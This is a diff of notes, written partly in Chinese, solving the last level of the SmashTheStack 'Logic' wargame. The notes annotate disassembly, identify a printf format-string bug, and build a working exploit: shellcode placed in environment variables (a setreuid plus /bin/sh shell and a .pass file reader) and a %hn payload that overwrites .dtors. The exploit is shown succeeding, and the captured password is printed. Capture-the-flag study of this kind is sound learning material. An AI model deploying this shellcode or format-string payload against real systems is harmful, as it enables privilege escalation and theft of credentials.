@@ -86,20 +86,20 @@ level10_hard:
  804879f:       8d 85 e8 fb ff ff       lea    0xfffffbe8(%ebp),%eax
  80487a5:       83 ec 0c                sub    $0xc,%esp
  80487a8:       50                      push   %eax
- 80487a9:       e8 b2 fd ff ff          call   8048560 <strlen@plt> /* strlen("SYNACK") */
+ 80487a9:       e8 b2 fd ff ff          call   8048560 <strlen@plt> /* strlen("SYNACK") ：0x804899a */
  80487ae:       83 c4 10                add    $0x10,%esp
  80487b1:       89 c3                   mov    %eax,%ebx   /*ebx = eax = 6 */
  80487b3:       8d 85 f0 fb ff ff       lea    0xfffffbf0(%ebp),%eax
  80487b9:       83 ec 0c                sub    $0xc,%esp
  80487bc:       50                      push   %eax
- 80487bd:       e8 9e fd ff ff          call   8048560 <strlen@plt> /* strlen("SYN") */
+ 80487bd:       e8 9e fd ff ff          call   8048560 <strlen@plt> /* strlen("SYN") ： 0x8048992 */
  80487c2:       83 c4 10                add    $0x10,%esp
- 80487c5:       39 c3                   cmp    %eax,%ebx       /*比较"SYNACK"与"SYN"的长度 */
+ 80487c5:       39 c3                   cmp    %eax,%ebx       /*比较0x804899a与0x8048992字符串的长度 */
  80487c7:       0f 85 bf 00 00 00       jne    804888c <main+0x230>
- 80487cd:       c7 85 a4 fb ff ff 00    movl   $0x0,0xfffffba4(%ebp)
+ 80487cd:       c7 85 a4 fb ff ff 00    movl   $0x0,0xfffffba4(%ebp) /* 0xfffffba4(%ebp) = 0 */
  80487d4:       00 00 00
  80487d7:       a0 c7 89 04 08          mov    0x80489c7,%al
- 80487dc:       88 85 a3 fb ff ff       mov    %al,0xfffffba3(%ebp)
+ 80487dc:       88 85 a3 fb ff ff       mov    %al,0xfffffba3(%ebp) /* eax = 0*/
  80487e2:       83 ec 04                sub    $0x4,%esp
  80487e5:       83 ec 0c                sub    $0xc,%esp
  80487e8:       e8 b3 fd ff ff          call   80485a0 <geteuid@plt>
@@ -118,28 +118,28 @@ level10_hard:
  8048811:       83 ec 08                sub    $0x8,%esp
  8048814:       68 c8 89 04 08          push   $0x80489c8
  8048819:       68 ca 89 04 08          push   $0x80489ca
- 804881e:       e8 4d fd ff ff          call   8048570 <fopen@plt>
+ 804881e:       e8 4d fd ff ff          call   8048570 <fopen@plt>  /* FILE* file = fopen("/home/level12/.pass","r")*/
  8048823:       83 c4 10                add    $0x10,%esp
  8048826:       89 85 a4 fb ff ff       mov    %eax,0xfffffba4(%ebp)
  804882c:       ff b5 a4 fb ff ff       pushl  0xfffffba4(%ebp)
  8048832:       6a 08                   push   $0x8
  8048834:       6a 01                   push   $0x1
- 8048836:       8d 85 a3 fb ff ff       lea    0xfffffba3(%ebp),%eax
+ 8048836:       8d 85 a3 fb ff ff       lea    0xfffffba3(%ebp),%eax /* */
  804883c:       50                      push   %eax
- 804883d:       e8 4e fd ff ff          call   8048590 <fread@plt>
+ 804883d:       e8 4e fd ff ff          call   8048590 <fread@plt> /* fread(0xfffffba3(%ebp), 0x1, 0x8) */
  8048842:       83 c4 10                add    $0x10,%esp
- 8048845:       c6 84 05 a3 fb ff ff    movb   $0x0,0xfffffba3(%ebp,%eax,1)
+ 8048845:       c6 84 05 a3 fb ff ff    movb   $0x0,0xfffffba3(%ebp,%eax,1) /* 写入字符串结尾的NULL字符 */
  804884c:       00
  804884d:       83 ec 08                sub    $0x8,%esp
- 8048850:       68 e0 89 04 08          push   $0x80489e0
- 8048855:       68 8e 89 04 08          push   $0x804898e
+ 8048850:       68 e0 89 04 08          push   $0x80489e0 /* "%s\n" */
+ 8048855:       68 8e 89 04 08          push   $0x804898e /* "Break it down now, bum, bum-dumb, bum bum bum BUM!!" */
  804885a:       e8 21 fd ff ff          call   8048580 <printf@plt>
  804885f:       83 c4 10                add    $0x10,%esp
  8048862:       83 ec 08                sub    $0x8,%esp
  8048865:       8d 85 a3 fb ff ff       lea    0xfffffba3(%ebp),%eax
  804886b:       50                      push   %eax
  804886c:       68 8e 89 04 08          push   $0x804898e
- 8048871:       e8 0a fd ff ff          call   8048580 <printf@plt>
+ 8048871:       e8 0a fd ff ff          call   8048580 <printf@plt> /* 打印fread读取的内容 */
  8048876:       83 c4 10                add    $0x10,%esp
  8048879:       83 ec 0c                sub    $0xc,%esp
  804887c:       ff b5 a4 fb ff ff       pushl  0xfffffba4(%ebp)
@@ -191,16 +191,16 @@ Dump of assembler code for function meep:
 0x002684a9 <meep+61>:   call   0x26836c <setresuid@plt>
 0x002684ae <meep+66>:   add    $0x10,%esp
 0x002684b1 <meep+69>:   sub    $0x4,%esp
-0x002684b4 <meep+72>:   push   $0x80
+0x002684b4 <meep+72>:   push   $0x80   
 0x002684b9 <meep+77>:   pushl  0x8(%ebp)
 0x002684bc <meep+80>:   lea    -0x88(%ebp),%eax
-0x002684c2 <meep+86>:   push   %eax
-0x002684c3 <meep+87>:   call   0x26835c <strncpy@plt>
+0x002684c2 <meep+86>:   push   %eax                    /*        0xbfffd190, 0xbfffd2a0, 0x80 */
+0x002684c3 <meep+87>:   call   0x26835c <strncpy@plt> /* strncpy(dest3,argv[1],0x80) */
 0x002684c8 <meep+92>:   add    $0x10,%esp
 0x002684cb <meep+95>:   sub    $0xc,%esp
 0x002684ce <meep+98>:   lea    -0x88(%ebp),%eax
 0x002684d4 <meep+104>:  push   %eax
-0x002684d5 <meep+105>:  call   0x26837c <printf@plt>
+0x002684d5 <meep+105>:  call   0x26837c <printf@plt> /* printf(dest3): 字符串格式化漏洞 */
 0x002684da <meep+110>:  add    $0x10,%esp
 0x002684dd <meep+113>:  mov    $0x0,%eax
 0x002684e2 <meep+118>:  mov    -0x4(%ebp),%ebx
@@ -208,3 +208,93 @@ Dump of assembler code for function meep:
 0x002684e6 <meep+122>:  ret    
 End of assembler dump.
 (gdb) 
+
+
+
+在meep函数中，有一个字符串格式化漏洞    
+<meep+105>:  call   0x26837c <printf@plt> /* printf(dest3): 字符串格式化漏洞 */ 
+
+(gdb) r $(perl -e 'print "AAAA"."[%08x]"x(100)') 
+(gdb) c
+Continuing.
+
+Breakpoint 1, 0x080486cd in main ()
+0x080486cd <main+113>:   e8 2e fe ff ff call   0x8048500 <ptrace@plt>
+(gdb) ni 
+0x080486d2 in main ()
+0x080486d2 <main+118>:   83 c4 10       add    $0x10,%esp
+(gdb) set $eax=0
+(gdb) c
+Continuing.
+AAAA[bfffd440][00000080][00e0847b][41414141][3830255b][255b5d78][5d783830][3830255b][255b5d78][5d783830][3830255b][255b5d78][5d783830][3830255b][255b5d78][5d783830][3830255b][255b5d78][5d783830][3830255b][%08n! Thanks For Playing!
+
+好，offset=4
+[level10@logic level10]$ export PAYLOAD=$'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
+[level10@logic level10]$ ./getenv012345 PAYLOAD
+PAYLOAD is at 0xbfffdfa4
+[level10@logic level10]$ ./getenv012345 PAYLOAD
+PAYLOAD is at 0xbfffdfa4
+[level10@logic level10]$ 
+
+[level10@logic level10]$ objdump -s -j .dtors level10_hard
+
+level10_hard:     file format elf32-i386
+
+Contents of section .dtors:
+ 8049a3c ffffffff 00000000 
+
+[addr+2]
+\x08\x04\x9a\x42
+[addr]
+\x08\x04\x9a\x40
+
+HOB: 0xbfff  LOB: 0xdfa4
+%.[HOB-8]x
+%.49143x  
+
+%[offset]$hn
+%4\$hn
+
+%.[LOB-HOB]x
+%.8101x
+
+%[offset + 1]$hn
+%.5\$hn
+
+
+$(python -c "print '\x42\x9a\x04\x08\x40\x9a\x04\x08'+'%.49143x%4\$hn%.8101x%5\$hn'")   
+
+上面用execv("/bin/sh")的方式打开了shell，但是在后台运行，下面使用一个读取文件的shellcode
+[level10@logic level10]$ export READ=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/level10/.pass'
+[level10@logic level10]$ ./getenv012345 READ
+READ is at 0xbfffdf72
+
+HOB: 0xbfff LOB: 0xdf72
+$(python -c "print '\x42\x9a\x04\x08\x40\x9a\x04\x08'+'%.49143x%4\$hn%.8051x%5\$hn'")
+
+经过测试，成功读出了/home/level10/.pass内容
+将文件名改为/home/level11/.pass后测试：
+[level10@logic level10]$ ./level10_hard $(python -c "print '\x42\x9a\x04\x08\x40\x9a\x04\x08'+'%.49143x%4\$hn%.8051x%5\$hn'")
+B0000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+........5fWin! Thanks For Playing!
+iDj48s1u
+[level10@logic level10]$
+
+至此logic通关
+
+CONGRATS! You have successfully finished the Logic Wargame! If you have
+not all ready done so, you should come to IRC and say hello to everyone.
+We would very much enjoy being able to speak with you and hear any
+feedback that you have about our game! Ontop of that you will also now
+receive permanent auto-voice in our IRC channel, as a representation of
+your hardwork and dedication!
+
+We also encourage you to consider designing and submitting your own level
+designs to us to be included in this Wargame. We are always looking for
+new contributions and especially enjoy when it comes from our own players.
+
+If you are interested in this please contact us on IRC:
+   * irc.smashthestack.org
+   * #logic
+
+Thank you for being a part of our community 
